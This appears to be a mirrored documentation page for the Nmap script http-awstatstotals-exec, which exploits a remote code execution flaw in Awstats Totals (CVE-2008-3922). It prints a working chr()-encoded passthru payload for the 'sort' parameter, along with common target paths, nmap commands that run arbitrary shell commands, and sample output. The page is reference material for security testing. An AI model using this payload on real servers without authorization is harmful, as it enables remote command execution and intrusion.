@@ -1,0 +1,312 @@
+﻿   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+    <title>http-awstatstotals-exec NSE Script -VER007</title>
+    
+
+</HEAD>
+
+
+
+
+
+
+<a href="../nmap-script-help.html">HOME>>>>>>>>></a>
+
+
+
+<h1>File <code>http-awstatstotals-exec</code></h1>
+
+
+
+<p>
+
+
+<a href="http://nmap.org/book/nse-script-format.html#nse-format-rules">脚本使用类型</a>:
+portrule
+<br>
+
+  脚本所属分类:
+  <i><a href="http://nmap.org/nsedoc/categories/vuln.html">vuln</a></i>, <i><a href="http://nmap.org/nsedoc/categories/intrusive.html">intrusive</a></i>, <i><a href="http://nmap.org/nsedoc/categories/exploit.html">exploit</a></i>
+  <br>
+
+脚本下载地址: <a href="http://nmap.org/svn/scripts/http-awstatstotals-exec.nse">http://nmap.org/svn/scripts/http-awstatstotals-exec.nse</a>
+</p>
+
+
+
+<h2> User Summary </h2>
+
+<p>
+Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it (CVE: 2008-3922).
+</p>
+<p>
+This vulnerability can be exploited through the GET variable sort. The script queries the web server with the command payload encoded using PHP's chr() function:
+<code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>
+</p>
+<p>
+Common paths for Awstats Total:
+<ul>
+<li><code>/awstats/index.php</code>
+</li>
+<li><code>/awstatstotals/index.php</code>
+</li>
+<li><code>/awstats/awstatstotals.php</code>
+</li>
+</ul>
+</p>
+<p>
+References:
+<ul>
+<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922</a> 
+</li>
+<li><a href="http://www.exploit-db.com/exploits/17324/">http://www.exploit-db.com/exploits/17324/</a></li>
+</ul>
+</p>
+
+
+
+
+
+
+
+  
+  
+  
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+  
+  
+    
+    
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+  
+  
+    
+    
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+
+
+  <h2> Script Arguments </h2>
+  <p>
+    
+      <h4> http-awstatstotals-exec.uri </h4>
+      <p>
+Awstats Totals URI including path. Default: /index.php</p>
+
+    
+      <h4> http-awstatstotals-exec.cmd </h4>
+      <p>
+Command to execute. Default: whoami</p>
+
+    
+      <h4> http-awstatstotals-exec.outfile </h4>
+      <p>
+Output file. If set it saves the output in this file.
+</p>
+<p>
+Other useful args when running this script:
+http.useragent - User Agent to use in GET request</p>
+
+    
+
+    
+      <h4> smbdomain, smbhash, smbnoguest, smbpassword, smbtype, smbusername </h4>
+      See the documentation for the <a href="http://nmap.org/nsedoc/lib/smbauth.html#script-args">smbauth</a> library.
+    
+      <h4> http.max-cache-size, http.max-pipeline, http.pipeline, http.useragent </h4>
+      See the documentation for the <a href="http://nmap.org/nsedoc/lib/http.html#script-args">http</a> library.
+    
+  </p>
+
+
+<h2> Example Usage </h2>
+<p>执行格式
+
+  <pre>nmap -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' &lt;target&gt;
+nmap -sV --script http-awstatstotals-exec.nse &lt;target&gt;
+</pre>
+
+</p>
+
+
+  <h2> Script Output </h2>
+<pre>PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+| http-awstatstotals-exec.nse:
+|_Output for 'uname -a':Linux 2.4.19 #1 Son Apr 14 09:53:28 CEST 2002 i686 GNU/Linux
+</pre>
+
+
+
+  <h2> Requires </h2>
+  <ul>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/http.html">http</a></li>
+  
+     <li><a href="">io</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/nmap.html">nmap</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/shortport.html">shortport</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/stdnse.html">stdnse</a></li>
+  
+     <li><a href="">string</a></li>
+  
+  </ul>
+
+
+<hr/>
+
+
+
+
+
+
+<p><b>Author: </b>Paulino Calderon</p>
+
+
+
+<p><b>License: </b> VER007 整理 <a href="http://www.ver007.com">http://www.ver007.com</a></p>
+
+
+
+
+
+
+
+
+
+	
+</ul>
+
+
+
+
+
+
+
+
+</dd>
+
+</dl>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+</BODY>
+</HTML>
+
+
